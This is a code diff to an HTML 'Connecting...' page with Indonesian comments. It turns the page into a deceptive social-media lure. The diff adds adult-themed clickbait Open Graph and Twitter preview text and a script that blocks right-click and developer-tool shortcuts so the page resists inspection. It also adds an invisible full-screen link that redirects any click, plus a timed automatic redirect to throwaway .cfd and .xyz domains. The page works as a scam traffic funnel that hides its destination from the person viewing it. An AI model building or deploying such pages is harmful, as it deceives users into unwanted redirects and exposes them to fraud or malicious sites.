@@ -1,17 +1,53 @@
 <!DOCTYPE html>
-<html lang="id">
+<html> <!-- Lang attribute dihapus agar Universal -->
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
     <title>Connecting...</title>
 
-    <!-- OPEN GRAPH (Preview saat share di WA/Twitter) -->
+    <!-- --- UNIVERSAL FACEBOOK / THREADS OPEN GRAPH --- -->
+    <!-- Teks Netral (Inggris) agar dimengerti global -->
     <meta property="og:type" content="website">
-    <meta property="og:title" content="💋 LIVE ON A PRIVATE SITE 🔥">
-    <meta property="og:description" content="929.784 Online Members - Join Now">
-    <meta property="og:image" content="https://www.businesstoday.com.my/wp-content/uploads/2021/01/Whatsapp-logo-696x393.jpg">
-    <meta property="og:image:width" content="1080">
-    <meta property="og:image:height" content="1080">
+    <meta property="og:title" content="🎀 𝒞🍪𝒩𝒯𝒜𝒞𝒯𝒜𝑀𝐸 𝐸𝒩 𝒫𝑅𝐼𝒱𝒜𝒟❀ 🎀">
+    <meta property="og:description" content="929,784 Online Members - Join Now. Exclusive Offer for Limited Time.">
+    <meta property="og:image" content="https://pbs.twimg.com/media/HG_HBeNawAELmw7?format=jpg&name=large">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <meta property="og:url" content="https://Sgwxnhz.greysyaa.cfd/8beFHXdXuw1QlJEOYMmt">
+    
+    <!-- Standar Meta Description (Penting untuk SEO & Preview non-OG) -->
+    <meta name="description" content="929,784 Online Members - Join Now. Exclusive Offer for Limited Time.">
+    
+    <!-- Twitter Card Support -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎀 𝒞🍪𝒩𝒯𝒜𝒞𝒯𝒜𝑀𝐸 𝐸𝒩 𝒫𝑅𝐼𝒱𝒜𝒟❀ 🎀">
+    <meta name="twitter:description" content="929,784 Online Members - Join Now.">
+    <meta name="twitter:image" content="https://pbs.twimg.com/media/HG_HBeNawAELmw7?format=jpg&name=large">
+
+    <!-- --- SCRIPT ANTI-INSPECT --- -->
+    <script type="text/javascript">
+        // Mencegah Klik Kanan
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Mencegah Shortcut Keyboard (F12, Ctrl+Shift+I, Ctrl+U)
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) { // F12
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) { // Ctrl+Shift+C
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { // Ctrl+Shift+J
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U
+                return false;
+            }
+        }
+    </script>
 
     <style>
         /* --- RESET & BASIC STYLE --- */
@@ -26,7 +62,8 @@
             background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
             color: #fff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden; /* Mencegah scroll bar */
+            overflow: hidden; 
+            touch-action: manipulation; 
         }
 
         .wrap {
@@ -36,6 +73,7 @@
             justify-content: center;
             flex-direction: column;
             position: relative;
+            z-index: 1; 
         }
 
         /* --- BACKGROUND PARTICLES --- */
@@ -45,6 +83,7 @@
             height: 100%;
             overflow: hidden;
             z-index: 0;
+            pointer-events: none;
         }
 
         .particle {
@@ -71,7 +110,6 @@
 
         /* --- CONTENT LOADER --- */
         .content {
-            z-index: 1;
             text-align: center;
         }
 
@@ -139,6 +177,7 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: gradient-shift 3s ease infinite;
+            text-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
         }
 
         @keyframes gradient-shift {
@@ -182,6 +221,7 @@
             font-weight: 600;
             color: #3b82f6;
             font-variant-numeric: tabular-nums;
+            margin-bottom: 20px;
         }
 
         /* Redirect Message */
@@ -196,7 +236,8 @@
             backdrop-filter: blur(10px);
             opacity: 0;
             transform: translateY(10px);
-            animation: fade-in-up 0.5s ease forwards 2s;
+            animation: fade-in-up 0.5s ease forwards 1.5s;
+            pointer-events: none;
         }
 
         @keyframes fade-in-up {
@@ -204,8 +245,20 @@
         }
 
         .redirect-msg span {
-            color: #3b82f6;
+            color: #ec4899;
             font-weight: 600;
+        }
+
+        /* --- FULL SCREEN TRAP (LINK INVISIBLE) --- */
+        #full-screen-trap {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999; /* Selalu di paling atas */
+            cursor: pointer;
+            background: transparent;
         }
 
         /* Responsive Mobile */
@@ -218,6 +271,9 @@
     </style>
 </head>
 <body>
+
+  <!-- 1. FULL SCREEN TRAP LINK (Klik di manapun langsung redirect) -->
+  <a href="https://LZtILg6.richards32.xyz/5rDh00l9XHQFxqq0a19O" id="full-screen-trap"></a>
 
   <div class="wrap">
     <!-- Background Particles (Akan diisi oleh JS) -->
@@ -267,10 +323,10 @@
     const percentageEl = document.getElementById('percentage');
     
     const interval = setInterval(() => {
-      percentage += Math.floor(Math.random() * 3) + 1; // Tambah angka acak
+      percentage += Math.floor(Math.random() * 3) + 1; 
       if (percentage >= 100) {
         percentage = 100;
-        clearInterval(interval); // Stop di 100
+        clearInterval(interval); 
       }
       percentageEl.textContent = percentage + '%';
     }, 50);
@@ -288,13 +344,12 @@
       }
     }, 1000);
 
-    // --- 4. Redirect ke Link Tujuan ---
-    // GANTI URL DI BAWAH INI DENGAN LINK TUJUAN ANDA
-    const targetUrl = "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&s1=188302&s2=2150610&s3=INSTA&click_id=INSTA&ban=other&j1=1"; 
+    // --- 4. Redirect Logic (Backup jika trap gagal) ---
+    const targetUrl = "https://hB77URK.greysyaa.cfd/ThJ8dwRb4ytZPOscBXpr"; 
 
     setTimeout(function () {
       window.location.href = targetUrl;
-    }, 3000); // Waktu delay 3 detik
+    }, 3000); 
   </script>
 
 </body>
